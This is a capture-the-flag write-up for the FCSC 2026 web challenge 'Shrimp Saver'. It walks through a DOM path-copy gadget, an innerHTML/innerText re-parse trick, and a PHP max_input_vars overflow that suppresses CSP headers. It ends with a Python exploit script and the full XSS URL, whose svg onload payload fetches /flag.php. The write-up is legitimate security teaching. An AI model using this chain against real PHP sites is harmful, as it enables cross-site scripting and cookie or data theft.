# Shrimp Saver

**Category:** Web
**Event:** FCSC 2026

## TL;DR

The app has a `copy(key, value)` function that writes URL params as dot-paths into `document.body`. `document.body.baseURI` reflects the full URL including our query string. By overflowing PHP's `max_input_vars` with 1000+ params, the PHP warning fires before headers are sent, killing the CSP. We then reflect an XSS payload from the URL into the DOM via `innerHTML=baseURI` and a double-decode trick.

## Setup

PHP page with a strict CSP using a random per-request nonce:

```
Content-Security-Policy: default-src 'self'; connect-src 'self'; script-src 'nonce-<random>;
```

`app.js` reads every URL query param and treats the key as a destination and the value as a source path on `document.body`:

```javascript
var blacklist = ["constructor", "__proto__"];

function resolvePath(obj, parts) {
    let target = obj;
    for (let part of parts) {
        if (blacklist.includes(part)) throw new Error("Blacklisted path part");
        if (target[part] === undefined) throw new Error(`Invalid path ${part}`);
        target = target[part];
    }
    return target;
}

function copy(copyTo, copyFrom) {
    const parts = copyTo.split(".");
    const lastPart = parts.pop();
    const target = resolvePath(document.body, parts);
    const value = resolvePath(document.body, copyFrom.split("."));
    target[lastPart] = value;
}

const searchParams = new URLSearchParams(window.location.search);
for (const [name, value] of searchParams.entries()) {
    copy(name, value);
}
```

The bot visits URLs we send it and has the `FLAG` cookie set.

## Recon - what can we write?

First instinct is `?innerHTML=<payload>` but we need the value to also be a property of `document.body`, not a raw string. So we need to find a property that contains something we control.

`document.body.baseURI` returns the full current page URL. If we do `?innerHTML=baseURI`, the page's innerHTML gets set to the URL itself - which contains all our other query params. So we can inject HTML through the URL.

Quick test (from notes):

```
http://0.0.0.0:8000/?innerHTML=baseURI&<img src=q onerror=alert(1)>
```

This sets `innerHTML` to the full URL string including `<img src=q onerror=alert(1)>`. The XSS fires... but CSP blocks the inline handler.

## Phase 1 - Killing the CSP via PHP max_input_vars overflow

From the notes, after looking at a writeup from ASIS CTF Quals 2025 (https://blog.arkark.dev/2025/09/08/asisctf-quals/):

PHP emits a warning when the number of query parameters exceeds `max_input_vars` (default: 1000). The warning goes straight to the response body. Since output has already started, PHP can't send any headers. The CSP header never makes it to the browser.

The exact output:
```
Warning: PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0
Warning: Cannot modify header information - headers already sent in /var/www/html/index.php on line 3
...
```

The page is now rendered without CSP. Also, since this output appears before the DOCTYPE, the browser goes into quirks mode.

We don't control any value in that warning string, but we don't need to - we just need it to fire before headers are sent.

## Phase 2 - XSS via baseURI + double innerHTML trick

Direct `innerHTML=baseURI` gives us the raw URL string. The problem: our XSS payload in the URL is URL-encoded (e.g. `%3C` instead of `<`), so it renders as escaped text, not tags.

The fix: use `innerText` as an intermediate step. Setting `innerHTML` to the URL puts the HTML-encoded URL as text content. Then reading `innerText` from that element gives back the decoded string. Setting `innerHTML` again from that decoded string causes the browser to parse the tags.

But we can't do `innerHTML = innerText` on the same element at the same time... so we use a child element:

```
?children.35.innerHTML=baseURI
&children.35.innerHTML=children.35.innerText
```

Wait - URLSearchParams processes duplicate keys in order, but both set the same property. The second one runs after the first and overwrites. At the time the second one runs, `children.35.innerHTML` already contains the URL string with HTML-encoded chars. Reading `children.35.innerText` now gives back the decoded version. Setting `innerHTML` to that decoded version re-parses the tags.

`children.35` is the 35th child of `document.body`. Looking at the actual page DOM, this index lands on a specific element. We use a child rather than `document.body` directly to not blow up the whole page.

## The HTML entities trick

URL params containing `<` get percent-encoded in the URL. But we can use HTML entities instead: `&#x3C;` for `<`. When the URL is reflected into innerHTML via baseURI, the entity gets decoded. Then the second innerHTML = innerText pass re-parses it as a real tag.

## Exploit

From `exploit.py`:

```python
import requests
import base64

URL = "http://0.0.0.0:8000/"

def trigger_php_quirks(URL):
    payload = b"fetch('/flag.php').then(r => r.text()).then(t => console.log('FLAAAAAAAAAAAAAAAAG : ', t));;"
    payload = f"eval(atob('{base64.b64encode(payload).decode()}'))"

    print("http://shrimp-saver/" + "?children.35.innerHTML=baseURI&children.35.innerHTML=children.35.innerText&" + "a&"*1001 + f"&#x3C;svg/onload={payload}&#x3E")
```

The URL structure:
- `children.35.innerHTML=baseURI` - copy the full page URL into children[35].innerHTML
- `children.35.innerHTML=children.35.innerText` - re-parse: decode HTML entities by reading innerText, set as innerHTML again
- `a&` repeated 1001 times - overflow max_input_vars, strip CSP headers
- `&#x3C;svg/onload=eval(atob(...))&#x3E;` - the XSS payload encoded as HTML entities so it survives the URL reflection

Full URL sent to bot:

```
http://shrimp-saver/?children.35.innerHTML=baseURI&children.35.innerHTML=children.35.innerText&a&a&...a&&#x3C;svg/onload=eval(atob(`ZmV0Y2goJy9mbGFnLnBocCcpLnRoZW4ocj...`))&#x3E;
```

The bot console output comes back to us (per the bot's tip message). `flag.php` returns the flag.

There's also `xss_without_php` in the script for testing XSS without the PHP quirks trick (no CSP bypass, just confirming DOM injection works):

```python
def xss_without_php(URL):
    payload = b"alert(1)"
    print(URL + "?children.35.innerHTML=baseURI&children.35.innerHTML=children.35.innerText&" + f"&#x3C;svg/onload={payload}&#x3E")
```

This was used locally to verify the injection path before adding the max_input_vars overflow.

## Flag

`FCSC{...}`
